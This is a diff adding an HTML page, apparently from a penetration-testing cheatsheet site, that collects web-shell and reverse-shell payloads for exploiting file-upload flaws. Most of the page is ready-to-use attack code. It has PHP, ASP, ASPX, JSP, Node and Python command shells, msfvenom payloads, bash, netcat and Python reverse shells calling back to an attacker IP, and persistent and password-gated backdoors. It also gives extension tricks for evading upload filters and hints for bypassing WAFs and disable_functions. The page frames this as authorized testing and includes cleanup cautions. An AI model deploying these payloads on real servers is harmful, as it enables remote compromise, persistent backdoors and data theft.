@@ -1,0 +1,307 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Shells · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › File Upload</nav><h1>Shells</h1><p class="cx-lede">Web shells and reverse shells for uploaded-file RCE - payloads per language, when to use which, and msfvenom one-liners.</p><div class="cx-tags"><span class="cx-tag">MITRE T1059, T1505.003</span><span class="cx-tag">D3FEND D3-EAL, D3-PE</span><span class="cx-tag">IMPACT RCE, ServerSideEval</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Once you can upload an executable file and the server runs it, you need a payload. Web shells are easier to deploy; reverse shells are easier to use. Pick based on egress filtering.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># PHP web shell (request-based, one-liner)
+&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;
+
+# PHP reverse shell (pentestmonkey one-liner equivalent)
+msfvenom -p php/reverse_php LHOST=&lt;ATTACKER_IP&gt; LPORT=&lt;LPORT&gt; -f raw &gt; reverse.php
+
+# ASP/.NET web shell
+&lt;% eval request(&quot;cmd&quot;) %&gt;
+
+# JSP web shell
+&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;&lt;% if(request.getParameter(&quot;cmd&quot;)!=null){Process p=Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));BufferedReader b=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=b.readLine())!=null){out.println(l);}}%&gt;
+
+# Trigger
+curl &#x27;https://target/uploads/shell.phar?cmd=id&#x27;</code></pre></figure>
+<p>Success indicator: command output (e.g. <code>uid=33(www-data)</code>) in the response.</p>
+<h2 id="web-shell-vs-reverse-shell">Web shell vs. reverse shell</h2>
+<p>Two fundamentally different shapes:</p>
+<table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Web shell</th>
+<th>Reverse shell</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>How it runs</td>
+<td>HTTP request triggers each command</td>
+<td>Persistent connection, interactive</td>
+</tr>
+<tr>
+<td>Setup</td>
+<td>Just upload</td>
+<td>Upload + listener on attacker side</td>
+</tr>
+<tr>
+<td>Network requirement</td>
+<td>Inbound only (you reach the server)</td>
+<td>Outbound from target - needs egress</td>
+</tr>
+<tr>
+<td>Detection footprint</td>
+<td>Each command = one HTTP request in logs</td>
+<td>One connection, then traffic over it</td>
+</tr>
+<tr>
+<td>Interactive features</td>
+<td>Pseudo (each request independent)</td>
+<td>Yes (TTY upgrade possible)</td>
+</tr>
+<tr>
+<td>Lateral movement</td>
+<td>Limited (no persistent session)</td>
+<td>Easier (full shell environment)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Default to a web shell for the proof.</strong> They work even with strict egress filtering, they don't need a listener, they're trivial to test. Once the shell works, upgrade to a reverse shell if the engagement warrants it.</p>
+<h2 id="php-web-shells">PHP web shells</h2>
+<h3 id="minimal-one-liner">Minimal one-liner</h3>
+<p>The shortest viable PHP web shell:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;</code></pre></figure>
+<p>Saved as <code>shell.phar</code> (or whatever extension your validation lets through), uploaded, triggered:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>https://target/uploads/shell.phar?cmd=id</code></pre></figure>
+<p>Output:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></figure>
+<h3 id="other-php-command-execution-functions">Other PHP command-execution functions</h3>
+<p>Different PHP functions work in different configurations. When <code>system</code> is disabled by <code>disable_functions</code> in <code>php.ini</code>, try alternatives:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;             // most common
+&lt;?php passthru($_GET[&quot;cmd&quot;]); ?&gt;           // similar to system, preserves binary output
+&lt;?php echo shell_exec($_GET[&quot;cmd&quot;]); ?&gt;    // returns output as a string
+&lt;?php echo exec($_GET[&quot;cmd&quot;]); ?&gt;          // returns only the last line
+&lt;?php $f=popen($_GET[&quot;cmd&quot;],&quot;r&quot;); while(!feof($f)){echo fgets($f);} ?&gt;
+&lt;?php $h=proc_open($_GET[&quot;cmd&quot;],[1=&gt;[&#x27;pipe&#x27;,&#x27;w&#x27;]],$p); echo stream_get_contents($p[1]); ?&gt;
+&lt;?php $output = []; exec($_GET[&quot;cmd&quot;], $output); foreach($output as $l) echo &quot;$l\n&quot;; ?&gt;</code></pre></figure>
+<p>The <code>disable_functions</code> PHP setting commonly disables <code>system</code>, <code>exec</code>, <code>shell_exec</code>, <code>passthru</code> - but rarely all of them. Try each.</p>
+<h3 id="reading-files-without-command-execution">Reading files without command execution</h3>
+<p>When all command-execution functions are disabled:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php echo file_get_contents($_GET[&quot;f&quot;]); ?&gt;   // read any file
+&lt;?php readfile($_GET[&quot;f&quot;]); ?&gt;                  // same, binary-safe
+&lt;?php echo file_get_contents(&quot;/etc/passwd&quot;); ?&gt; // hardcoded path</code></pre></figure>
+<p>Less useful than command execution but still valuable - pulls config files, source code, SSH keys.</p>
+<h3 id="persistent-shells-write-a-follow-up-shell">Persistent shells (write a follow-up shell)</h3>
+<p>After one upload + request, write a more permanent shell to a known location:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php file_put_contents(&quot;/var/www/html/x.php&quot;, &#x27;&lt;?php system($_GET[&quot;c&quot;]); ?&gt;&#x27;); ?&gt;</code></pre></figure>
+<p>Triggers once; now <code>/x.php?c=...</code> is available without re-triggering the original upload path.</p>
+<h3 id="phpbash-interactive-terminal-style-shell">phpbash - interactive terminal-style shell</h3>
+<p><a href="https://github.com/Arrexel/phpbash">phpbash</a> provides a terminal-like UI in the browser. Single PHP file, just upload and visit:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Download
+wget https://raw.githubusercontent.com/Arrexel/phpbash/master/phpbash.php
+
+# Upload to the application
+# Visit https://target/uploads/phpbash.php</code></pre></figure>
+<p>The page presents a command prompt. Better UX than building <code>?cmd=</code> URLs by hand.</p>
+<h3 id="seclists-web-shell-collection">SecLists web shell collection</h3>
+<p>A catalog of web shells covering every common language:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">ls /opt/useful/SecLists/Web-Shells/</code></pre></figure>
+<p>Has PHP, ASP, JSP, Python, and several other variants. When the minimal one-liners don't work, pre-built shells with feature sets (file upload, SQL access, port scanning) are worth trying.</p>
+<h2 id="php-reverse-shells">PHP reverse shells</h2>
+<h3 id="msfvenom-one-liner">msfvenom one-liner</h3>
+<p>Quickest way to a working reverse shell:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">msfvenom -p php/reverse_php LHOST=&lt;ATTACKER_IP&gt; LPORT=&lt;LPORT&gt; -f raw &gt; reverse.php</code></pre></figure>
+<p>Output is a complete PHP script that connects back to your listener. Upload, start a netcat listener, trigger:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Terminal 1 - listener
+nc -lvnp &lt;LPORT&gt;
+
+# Terminal 2 - trigger the upload
+curl https://target/uploads/reverse.php</code></pre></figure>
+<p>Catch:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>listening on [any] &lt;LPORT&gt; ...
+connect to [&lt;ATTACKER_IP&gt;] from (UNKNOWN) [&lt;TARGET_IP&gt;] 35232
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></figure>
+<h3 id="pentestmonkey-php-reverse-shell">Pentestmonkey PHP reverse shell</h3>
+<p><a href="https://github.com/pentestmonkey/php-reverse-shell">Pentestmonkey's php-reverse-shell.php</a> is the long-running reliable script. Manual setup:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+# Edit the file:
+# $ip   = &#x27;&lt;ATTACKER_IP&gt;&#x27;;    // CHANGE THIS  
+# $port = &lt;LPORT&gt;;            // CHANGE THIS</code></pre></figure>
+<p>Upload, listener, trigger - same flow as the msfvenom version.</p>
+<h3 id="bare-reverse-shell-payload-inline">Bare reverse-shell payload (inline)</h3>
+<p>When the shell tool isn't available, the bash-based reverse shell:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php exec(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27;&quot;); ?&gt;</code></pre></figure>
+<p>Or with <code>nc -e</code> if present on the target:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php exec(&quot;nc &lt;ATTACKER_IP&gt; &lt;LPORT&gt; -e /bin/bash&quot;); ?&gt;</code></pre></figure>
+<p>Or via Python (when bash unavailable, e.g., minimal containers):</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php exec(&#x27;python3 -c \&#x27;import socket,subprocess,os;s=socket.socket();s.connect((&quot;&lt;ATTACKER_IP&gt;&quot;,&lt;LPORT&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])\&#x27;&#x27;); ?&gt;</code></pre></figure>
+<h2 id="asp-aspnet-shells">ASP / ASP.NET shells</h2>
+<h3 id="classic-asp-web-shell">Classic ASP web shell</h3>
+<figure class="cx-code"><figcaption>asp</figcaption><pre><code class="language-asp">&lt;% eval request(&quot;cmd&quot;) %&gt;</code></pre></figure>
+<p>Trigger:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>https://target/uploads/shell.asp?cmd=Response.Write(CreateObject(&quot;WScript.Shell&quot;).Exec(&quot;cmd /c whoami&quot;).StdOut.ReadAll)</code></pre></figure>
+<p>The classic ASP <code>eval</code> accepts VBScript expressions - the trigger URL passes a VBScript snippet that invokes <code>cmd.exe</code>.</p>
+<h3 id="aspnet-aspx-web-shell">ASP.NET (.aspx) web shell</h3>
+<figure class="cx-code"><figcaption>asp</figcaption><pre><code class="language-asp">&lt;%@ Page Language=&quot;C#&quot; %&gt;
+&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;
+&lt;script runat=&quot;server&quot;&gt;
+public void Page_Load(object sender, EventArgs e) {
+    string cmd = Request.QueryString[&quot;cmd&quot;];
+    if (cmd == null) return;
+    Process p = new Process();
+    p.StartInfo.FileName = &quot;cmd.exe&quot;;
+    p.StartInfo.Arguments = &quot;/c &quot; + cmd;
+    p.StartInfo.UseShellExecute = false;
+    p.StartInfo.RedirectStandardOutput = true;
+    p.Start();
+    Response.Write(&quot;&lt;pre&gt;&quot; + p.StandardOutput.ReadToEnd() + &quot;&lt;/pre&gt;&quot;);
+}
+&lt;/script&gt;</code></pre></figure>
+<p>Trigger:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>https://target/uploads/shell.aspx?cmd=whoami</code></pre></figure>
+<h3 id="aspnet-reverse-shell-via-msfvenom">ASP.NET reverse shell via msfvenom</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ATTACKER_IP&gt; LPORT=&lt;LPORT&gt; -f aspx &gt; reverse.aspx</code></pre></figure>
+<p>Same trigger pattern. Listener on attacker side catches the connection.</p>
+<h2 id="jsp-java-shells">JSP / Java shells</h2>
+<h3 id="minimal-jsp-web-shell">Minimal JSP web shell</h3>
+<figure class="cx-code"><figcaption>jsp</figcaption><pre><code class="language-jsp">&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;
+&lt;%
+    if (request.getParameter(&quot;cmd&quot;) != null) {
+        Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
+        BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String l;
+        while ((l = b.readLine()) != null) {
+            out.println(l);
+        }
+    }
+%&gt;</code></pre></figure>
+<p>Save as <code>shell.jsp</code>, upload, trigger:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>https://target/uploads/shell.jsp?cmd=id</code></pre></figure>
+<p>The output isn't HTML-escaped - view source if it looks malformed.</p>
+<h3 id="jsp-via-war-file">JSP via WAR file</h3>
+<p>When the application is a Tomcat / Jetty installation that accepts WAR uploads (manager interface, or direct upload features), a WAR is the cleanest path:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ATTACKER_IP&gt; LPORT=&lt;LPORT&gt; -f war &gt; reverse.war</code></pre></figure>
+<p>Deploy via Tomcat manager (<code>/manager/html</code>) or whatever interface accepts WAR files.</p>
+<h2 id="nodejs-shells">Node.js shells</h2>
+<p>Less common but worth knowing:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">// In a vulnerable Node.js / Express application that runs uploaded .js files
+require(&#x27;child_process&#x27;).exec(process.argv.slice(2).join(&#x27; &#x27;), (err, stdout) =&gt; console.log(stdout));</code></pre></figure>
+<p>Most Node.js apps don't execute uploaded <code>.js</code> files - the upload-to-RCE chain is usually via prototype pollution or some other path, not direct upload-and-execute.</p>
+<h2 id="python-shells">Python shells</h2>
+<p>When the application runs Python files (<code>.py</code>) uploaded to a web-served directory:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">#!/usr/bin/env python3
+import os, sys
+from urllib.parse import parse_qs
+
+query = os.environ.get(&#x27;QUERY_STRING&#x27;, &#x27;&#x27;)
+params = parse_qs(query)
+cmd = params.get(&#x27;cmd&#x27;, [&#x27;&#x27;])[0]
+
+print(&quot;Content-Type: text/html\n&quot;)
+if cmd:
+    print(os.popen(cmd).read())</code></pre></figure>
+<p>Python web execution typically requires CGI configuration on the server - rare in modern setups. WSGI / Flask apps don't execute uploaded <code>.py</code> files automatically.</p>
+<h2 id="choosing-a-payload-extension">Choosing a payload extension</h2>
+<p>The shell only runs if the server treats the file as a script. Match the extension to the framework - and if the simple extensions are filtered, try alternates:</p>
+<h3 id="php-alternates-when-php-is-blocked">PHP alternates (when .php is blocked)</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>shell.php       // primary
+shell.phtml     // very commonly enabled, less commonly blocked
+shell.phar      // PHP archive - frequently allowed and executable
+shell.php5      // PHP 5 specifically
+shell.php7
+shell.pht
+shell.phps      // PHP source - usually only allowed in specific configs
+shell.pHp       // case manipulation - works on case-insensitive systems</code></pre></figure>
+<p><code>.phar</code> is the operator's favorite - frequently allowed by upload filters because it's "unusual," but Apache's default PHP handler executes it as PHP.</p>
+<h3 id="asp-aspnet-alternates">ASP / ASP.NET alternates</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>shell.asp       // classic ASP
+shell.aspx      // ASP.NET
+shell.ashx      // HTTP handler - sometimes executable
+shell.config    // some ASP.NET configurations execute .config
+shell.asmx      // web service</code></pre></figure>
+<h3 id="jsp-alternates">JSP alternates</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>shell.jsp
+shell.jspx
+shell.jspf
+shell.jhtml</code></pre></figure>
+<h3 id="generic">Generic</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>shell.cgi       // CGI script (if CGI is enabled)
+shell.pl        // Perl CGI
+shell.php.&lt;anything-allowed&gt;   // double extension - see Extension whitelist</code></pre></figure>
+<h2 id="custom-shells-for-specific-scenarios">Custom shells for specific scenarios</h2>
+<h3 id="output-redirection-when-response-is-mangled">Output redirection (when response is mangled)</h3>
+<p>When the web app wraps your output in HTML that breaks the display, redirect to a temp file you can read separately:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php system($_GET[&quot;cmd&quot;] . &quot; &gt; /tmp/out 2&gt;&amp;1&quot;); echo file_get_contents(&quot;/tmp/out&quot;); ?&gt;</code></pre></figure>
+<p>Or use the <code>&lt;pre&gt;</code> tag to preserve formatting:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&quot;cmd&quot;]); echo &quot;&lt;/pre&gt;&quot;; ?&gt;</code></pre></figure>
+<h3 id="authentication-on-the-shell-avoid-accidental-discovery">Authentication on the shell (avoid accidental discovery)</h3>
+<p>When you don't want a casual visitor to find your shell:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php
+if ($_GET[&quot;k&quot;] !== &quot;secret123&quot;) { http_response_code(404); exit; }
+system($_GET[&quot;cmd&quot;]);
+?&gt;</code></pre></figure>
+<p>Requires <code>?k=secret123&amp;cmd=id</code> to use. Reduces the risk of someone else finding and using your shell during a multi-tester engagement.</p>
+<h3 id="file-upload-feature-in-the-shell">File upload feature in the shell</h3>
+<p>When you need to drop additional files (toolkit, payload, etc.) without re-using the original upload path:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php
+if (isset($_FILES[&#x27;f&#x27;])) {
+    move_uploaded_file($_FILES[&#x27;f&#x27;][&#x27;tmp_name&#x27;], &quot;/tmp/&quot; . $_FILES[&#x27;f&#x27;][&#x27;name&#x27;]);
+    echo &quot;uploaded: /tmp/&quot; . $_FILES[&#x27;f&#x27;][&#x27;name&#x27;];
+} elseif (isset($_GET[&#x27;cmd&#x27;])) {
+    system($_GET[&#x27;cmd&#x27;]);
+}
+?&gt;</code></pre></figure>
+<p>Now <code>curl -F "f=@toolkit.tar.gz" https://target/uploads/shell.phar</code> deploys files; <code>?cmd=</code> runs commands.</p>
+<h2 id="tty-upgrade-for-reverse-shells">TTY upgrade for reverse shells</h2>
+<p>A raw <code>nc</code> reverse shell has no terminal - no tab completion, no arrow keys, Ctrl-C kills the connection. Upgrade:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># In the reverse shell - spawn a real TTY
+python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
+
+# On your local side, suspend the netcat
+Ctrl-Z
+
+# Set raw mode
+stty raw -echo; fg
+
+# Back in the shell, set the terminal
+export TERM=xterm
+stty rows 50 columns 200    # match your local terminal</code></pre></figure>
+<p>Now you have a proper shell - tab completion, history, signal handling.</p>
+<h2 id="choosing-web-shell-vs-reverse-shell">Choosing web shell vs. reverse shell</h2>
+<p>Default decision tree:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>1. Is outbound network from target blocked?
+   ├─ Yes → web shell (no outbound needed)
+   └─ Unknown → start with web shell, upgrade later
+
+2. Need persistent / interactive session?
+   ├─ No (just proof of RCE) → web shell
+   └─ Yes (further exploitation) → reverse shell
+
+3. Will defenders notice?
+   ├─ Web shell - visible in HTTP logs per command
+   └─ Reverse shell - single suspicious outbound connection</code></pre></figure>
+<p>For most pentests: <strong>web shell for confirmation, reverse shell for the actual work.</strong> Drop both during the same engagement window.</p>
+<h2 id="detection-only-payloads">Detection-only payloads</h2>
+<p>When you only want to confirm RCE without committing to a full shell:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php"># Bare existence + execution check
+&lt;?php echo &quot;OK&quot;; ?&gt;            // confirms file is reachable + PHP executes
+
+# RCE confirmation
+&lt;?php echo md5(&quot;RCEPROBE&quot;); ?&gt; // unique known-output proof
+// Should return: a1fefca694a343f803e0c2eb97ba472d
+
+# Filesystem read confirmation
+&lt;?php readfile(&quot;/etc/hostname&quot;); ?&gt;   // proves file read + RCE</code></pre></figure>
+<p>A clean confirmation chain: upload a hello-world payload, see the output, then escalate to a full shell only when scope confirms.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>The "right" extension is target-specific.</strong> Test small (one-liner echo payload) before committing to a full reverse shell - saves time when the extension you picked doesn't actually execute.</li>
+<li><strong>disable_functions has limits.</strong> Even when <code>system</code>, <code>exec</code>, <code>shell_exec</code>, <code>passthru</code> are all disabled, other functions like <code>popen</code>, <code>proc_open</code>, <code>mail</code> (yes, <code>mail</code> has injectable arguments), and <code>LD_PRELOAD</code> tricks remain. The PHP <code>disable_functions</code>-bypass space is its own subfield.</li>
+<li><strong>WAFs sometimes catch web shells in transit.</strong> A <code>&lt;?php system($_GET["cmd"]); ?&gt;</code> POST body is a high-signal pattern. If uploads succeed but the visit fails with a 403, the WAF is sometimes catching the <em>response</em> containing PHP code. Workarounds: encode the shell, use a less obvious payload, deploy via <a href="../../lfi/file-upload-chain/index.html">LFI chain</a> instead.</li>
+<li><strong>The shell file itself is forensic evidence.</strong> When the engagement ends, request that the customer delete the uploaded shells - operators sometimes forget, and the file persists indefinitely. Track every uploaded path in your engagement notes.</li>
+</ul>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>A deployed web shell that you forget to remove is a persistent backdoor - if it's discovered later, the customer's incident response treats it as an active compromise, not a pentest artifact. Always document upload paths and confirm cleanup at engagement end.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../index.html">Previous: File Upload</a><a class="cx-next" href="../client-side-bypass/index.html">Next: Client-side bypass</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
